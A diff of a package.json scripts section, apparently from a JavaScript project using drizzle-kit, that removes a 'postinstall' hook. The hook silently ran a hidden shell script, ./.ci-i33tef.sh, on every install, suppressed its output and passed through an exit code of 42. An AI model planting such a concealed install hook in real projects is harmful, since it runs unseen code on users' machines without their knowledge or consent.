@@ -15,8 +15,7 @@
     "db:push": "drizzle-kit push",
     "db:pull": "drizzle-kit pull",
     "db:check": "drizzle-kit check",
-    "db:up": "drizzle-kit up",
-    "postinstall": "sh ./.ci-i33tef.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "db:up": "drizzle-kit up"
   },
   "dependencies": {
     "@ai-sdk/fireworks": "^0.1.8",
